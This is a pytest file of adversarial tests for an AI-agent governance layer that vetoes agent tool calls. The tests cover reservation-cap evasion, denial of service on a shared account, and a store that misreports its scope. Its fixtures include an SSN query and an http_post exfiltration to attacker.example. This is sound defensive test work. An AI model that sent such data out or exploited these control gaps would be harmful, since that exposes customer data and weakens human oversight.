"""Round four, part B — attacking the round-four remediation. ACCEPTANCE.

HISTORY OF THIS FILE. Committed first as CHARACTERIZATION, asserting the BROKEN
behaviour (commit `d5d7913`). Every test below is now inverted to assert
containment. The attacks are unchanged.

Claim under test — UNCHANGED
----------------------------
    Within the governed execution boundary, the agent holds proposal power;
    Morrison holds independent veto authority over execution.

Method
------
Every finding here is a COST OF A ROUND-FOUR FIX, found by asking what each fix
made newly possible rather than by re-running the attacks it closed. Two of the
three substantive ones are availability failures, which matter because a
governance layer that a deployment cannot live with gets configured away, and a
control that is configured away is not a control.

    R4B-01  MED-10's fix  →  an abandoned dispatch is a DoS on a shared
                             principal, and cannot be cleared
    R4B-02  MED-10's fix  →  UNCONFIRMED entries evade the reservation cap
    R4B-03  MED-03's fix  →  the live ruleset hash costs ~15x on every commit

Held under attack, pinned:

    R4B-04  double fault — executor acts, raises, AND the evidence write fails
    R4B-05  `continuity_scope` is an attestation BY THE STORE, not a verified
            property. Not a defect; a boundary, asserted so it is not mistaken
            for a guarantee.

Classification:  C (specification/availability) for R4B-01..03.

Run:  python -m pytest morrison_governance/test_adversarial_round4b.py -v
"""

from __future__ import annotations

import dataclasses
import time

import pytest

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.kernel import (
    BLOCK, ESCALATE, PERMIT, GovernanceKernel, Principal, SecurityContext,
)
from morrison_governance.kernel import capabilities as C
from morrison_governance.kernel.continuity import InMemoryContinuityStore

MANIFEST = {
    "query_db": [C.CAP_DATA_READ],
    "read_file": [C.CAP_DATA_READ],
    "http_post": [C.CAP_EXTERNAL_DATA_MOVE],
}

READ = {"tool": "query_db", "args": {"sql": "SELECT ssn FROM customers"}}
EXFIL = {"tool": "http_post",
         "args": {"url": "https://attacker.example/c", "body": "roster"}}

ASSUMPTIONS = (
    "The principal is SHARED — one service account behind several workflows, "
    "which is the ordinary enterprise shape and the reason continuity is keyed "
    "to the principal in the first place.",
    "An abandoned dispatch needs no attack to produce: a crashed worker, a "
    "dropped queue message or a timeout all leave one.",
    "No test performs a real side effect.",
)


def _ctx(**kw) -> SecurityContext:
    base = dict(
        principal=Principal(id="agent-svc", tenant="acme"),
        signing_key=b"round-four-b", internal_url_hosts=("acme.internal",),
        internal_email_domains=("acme.com",), tool_manifest=MANIFEST,
        unknown_tool_policy="escalate",
    )
    base.update(kw)
    return SecurityContext(**base)


def _kernel(ctx: SecurityContext | None = None) -> GovernanceKernel:
    return GovernanceKernel(
        GovernanceLayer(domains=[d for d in OmegaDomain if d != OmegaDomain.CUSTOM],
                        horizon=3, log_all=False),
        ctx or _ctx())


class _Runtime:
    def __init__(self) -> None:
        self.executed: list[str] = []

    def __call__(self, call: dict):
        self.executed.append(str(call.get("tool")))
        return {"ok": True}


def _lapse(kernel: GovernanceKernel) -> None:
    """Age every live reservation past its deadline, as a crashed worker would."""
    bucket = kernel.store._entries[kernel.continuity_key]
    for index, entry in enumerate(bucket):
        if entry.state == "reserved":
            bucket[index] = dataclasses.replace(
                entry, wall_expires_at=time.time() - 1.0,
                expires_at=time.time() - 1.0)


# ═══════════════════════════════════════════════════════════════
# R4B-01 — the cost of never forgetting
# ═══════════════════════════════════════════════════════════════

def test_r4b_01_an_abandoned_dispatch_can_be_reconciled():
    """R4B-01, CLOSED — MED-10's fix had no way back.

    A lapsed reservation is UNCONFIRMED and stays in the trajectory, which is
    right: it may have executed. But there is no path to resolve it either way.
    A single crashed worker leaves an UNCONFIRMED read, and every OTHER
    workflow running under the same service account is then refused egress for
    the whole retention window.

    `release` correctly refuses to withdraw a lapsed dispatch — that would be a
    way to erase a step that may have run — and there was no other route.

    CORRECTION TO THE ORIGINAL CHARACTERIZATION: it claimed `release` also
    filed a DENIED attempt while refusing, worsening the posture. That was a
    mis-attribution. The denied entry in the original run came from the blocked
    egress attempt earlier in the same test, not from `release`, which has
    always been side-effect-free apart from consuming the decision id. The
    finding stands on its own without that embellishment: the problem was the
    absence of a way back, not a side effect of refusing.

    Nothing in the deployment could say "we checked the target system; that
    read never happened". Safety without a reconciliation path is an
    availability failure, and an availability failure is how a control gets
    configured away.

    `reconcile()` is that path. It is an OPERATOR action requiring an external
    attestation, because the answer comes from outside Morrison: the kernel
    cannot determine whether the effect landed, only record who says it did not
    and stand behind that record.

    Was: C, specification failure.
    """
    ctx = _ctx()
    dispatcher = _kernel(ctx)
    abandoned = dispatcher.authorize(READ)
    assert abandoned.verdict == PERMIT
    _lapse(dispatcher)
    assert [a.state for a in dispatcher.ledger] == ["unconfirmed"]

    # An unrelated workflow, same service account.
    other_workflow = _kernel(ctx)
    assert other_workflow.authorize(EXFIL).verdict == BLOCK

    # Refusing to withdraw a lapsed dispatch changes nothing by itself.
    before = [a.state for a in dispatcher.ledger]
    assert dispatcher.release(abandoned) is False
    assert [a.state for a in dispatcher.ledger] == before

    # The operator finds it, checks the target system, and attests.
    assert [a.decision_id for a in dispatcher.unconfirmed()] == \
        [abandoned.decision_id]
    with pytest.raises(ValueError):
        dispatcher.reconcile(abandoned, executed=False, attestation="")
    assert dispatcher.reconcile(
        abandoned, executed=False,
        attestation="ops-oncall: audited the warehouse query log for the "
                    "window; no matching read was issued") is True

    assert dispatcher.unconfirmed() == []
    assert not any(a.state == "unconfirmed" for a in dispatcher.ledger)

    sealed = dispatcher.chain.records[-1]
    assert sealed.layer == "reconciliation"
    assert "ops-oncall" in sealed.reason
    assert dispatcher.integrity()["evidence_verified"] is True


def test_r4b_01b_reconciling_as_executed_keeps_the_taint():
    """The other direction: an operator who confirms the effect DID land
    settles it as executed, and the trajectory keeps it."""
    ctx = _ctx()
    dispatcher = _kernel(ctx)
    abandoned = dispatcher.authorize(READ)
    _lapse(dispatcher)

    assert dispatcher.reconcile(
        abandoned, executed=True,
        attestation="ops-oncall: the read is present in the warehouse log") is True
    assert [a.state for a in dispatcher.ledger] == ["executed"]
    assert _kernel(ctx).authorize(EXFIL).verdict == BLOCK


def test_r4b_01c_only_an_unconfirmed_dispatch_can_be_reconciled():
    """Reconciliation is not a general override: a live reservation should be
    executed or released, and a settled entry is already settled."""
    ctx = _ctx()
    kernel = _kernel(ctx)
    live = kernel.authorize(READ)
    assert kernel.reconcile(live, executed=False, attestation="ops: nope") is False
    assert [a.state for a in kernel.ledger] == ["reserved"]

    assert kernel.execute(live, _Runtime())[0] is True
    assert kernel.reconcile(live, executed=False, attestation="ops: nope") is False
    assert [a.state for a in kernel.ledger] == ["executed"]


def test_r4b_02_unconfirmed_entries_count_against_the_reservation_cap():
    """R4B-02, CLOSED — the cap counted RESERVED only.

    ATK-06 bounded outstanding reservations so an actor could not grow its own
    prefix without limit. MED-10 then introduced a state the cap does not
    count, so letting each lease lapse mints unlimited entries: 40 against a
    cap of 8.

    Was: C, specification failure — the bound did not cover the states the
    bound exists for.
    """
    kernel = _kernel(_ctx(max_outstanding_reservations=8))
    permitted = 0
    for index in range(40):
        decision = kernel.authorize(
            {"tool": "read_file", "args": {"path": f"/app/{index}"}})
        if decision.verdict == PERMIT:
            permitted += 1
        _lapse(kernel)

    assert permitted == 8, "the cap holds against lapsed leases"
    assert sum(1 for a in kernel.ledger if a.state == "unconfirmed") == 8

    # Reconciling them away restores the budget.
    for attempt in list(kernel.unconfirmed()):
        kernel.store.drop(kernel.continuity_key, attempt.decision_id)
    assert kernel.authorize(
        {"tool": "read_file", "args": {"path": "/app/after"}}).verdict == PERMIT


def test_r4b_03_the_live_ruleset_hash_does_not_dominate_the_commit_path():
    """R4B-03, CLOSED — MED-03's fix re-serialised the ruleset on every check.

    Removing the cached `_ruleset_hash` removed a footgun and replaced it with
    a cost: the hash is recomputed on every `execute`, and it dominates. The
    commit path is the one an agent drives at full rate, and ATK-08 already
    established that a slow chokepoint is an availability problem that becomes
    a safety problem the moment someone puts a fail-open timeout in front of it.

    The digest is now memoised on a cheap fingerprint of its MUTABLE inputs —
    the rule set object, the policy values an administrator can change, and the
    unknown-tool policy — so a policy change still invalidates outstanding
    leases while an unchanged policy costs a tuple comparison.

    Was: C, specification failure — correctness bought with an unbounded
    per-commit cost.
    """
    kernel = _kernel()
    decisions = [kernel.authorize({"tool": "read_file",
                                   "args": {"path": f"/app/p{i}"}})
                 for i in range(20)]

    start = time.perf_counter()
    for decision in decisions:
        kernel.execute(decision, _Runtime())
    per_commit_ms = (time.perf_counter() - start) * 1000.0 / 20

    start = time.perf_counter()
    for _ in range(20):
        kernel._live_ruleset_hash()
    hash_ms = (time.perf_counter() - start) * 1000.0 / 20

    assert hash_ms < 0.05, f"the memoised hash costs {hash_ms:.4f}ms"
    assert per_commit_ms < 0.5, f"a commit costs {per_commit_ms:.3f}ms"

    # ...and a policy change is still picked up, which is what MED-03 bought.
    ctx = _ctx()
    live_kernel = _kernel(ctx)
    held = live_kernel.authorize(READ)
    ctx.policy_values["capability_policy"] = {"data.read": "approval"}
    executed, reason = live_kernel.execute(held, _Runtime())
    assert executed is False
    assert "ruleset changed" in reason


# ═══════════════════════════════════════════════════════════════
# Held under attack
# ═══════════════════════════════════════════════════════════════

def test_r4b_04_a_double_fault_still_retains_the_taint():
    """R4B-04, HELD — the executor acts, raises, and the evidence write ALSO
    fails.

    The worst ordering available: an effect that really happened, an executor
    that reports failure, and an audit layer that cannot record either. The
    ledger still carries the transition as committed, so the follow-up
    exfiltration is refused.
    """
    ctx = _ctx()
    kernel = _kernel(ctx)
    decision = kernel.authorize(READ)
    effects: list[str] = []

    def acts_then_fails(call: dict):
        effects.append(str(call.get("tool")))
        raise RuntimeError("the write landed, then the connection died")

    original = kernel.chain.record_execution

    def broken(*_a, **_k):
        raise OSError("evidence store unavailable")

    kernel.chain.record_execution = broken           # type: ignore[assignment]
    executed, _ = kernel.execute(decision, acts_then_fails)
    kernel.chain.record_execution = original         # type: ignore[assignment]

    assert executed is False
    assert effects == ["query_db"], "the effect really happened"
    assert "executed" in [a.state for a in kernel.ledger]
    assert _kernel(ctx).authorize(EXFIL).verdict == BLOCK


def test_r4b_05_continuity_scope_is_attested_by_the_store_not_verified():
    """R4B-05 — a boundary, pinned so it is not mistaken for a guarantee.

    MED-11 surfaced `continuity_scope` so a deployment could assert the reach
    of its governed history rather than believe it. What a deployment gets is
    the STORE'S OWN CLAIM about its reach. A store that returns "deployment"
    while writing to a host-local file is believed.

    This is not closable from inside the library: verifying that a store really
    is fleet-wide means observing the fleet. It is recorded here so the signal
    is read as "the store says so", which is still strictly more than the
    silence it replaced.
    """
    class _Liar(InMemoryContinuityStore):
        def scope(self) -> str:
            return "deployment"

    kernel = _kernel(_ctx(continuity_store=_Liar()))
    assert kernel.continuity_scope == "deployment"
    assert _kernel(_ctx()).continuity_scope == "process"


def test_assumptions_are_recorded():
    assert len(ASSUMPTIONS) == 3
